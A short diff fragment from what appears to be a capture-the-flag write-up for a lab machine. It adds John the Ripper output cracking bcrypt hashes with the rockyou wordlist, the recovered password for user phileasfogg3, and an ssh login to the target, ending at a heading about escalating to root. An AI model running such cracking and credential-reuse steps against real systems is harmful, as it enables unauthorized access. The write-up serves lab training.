@@ -318,5 +318,17 @@ john hashes.txt -w=/usr/share/wordlists/rockyou.txt
 #### Output:
 
 ```
+Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!QAZ2wsx         (phileasfogg3)
+```
+
+We have found the password ```!QAZ2wsx``` for user phileasfogg3, enabling us to create an SSH session:
 
 ```
+ssh phileasfogg3@pterodactyl.htb
+```
+
+## phileasfogg3 -> Root
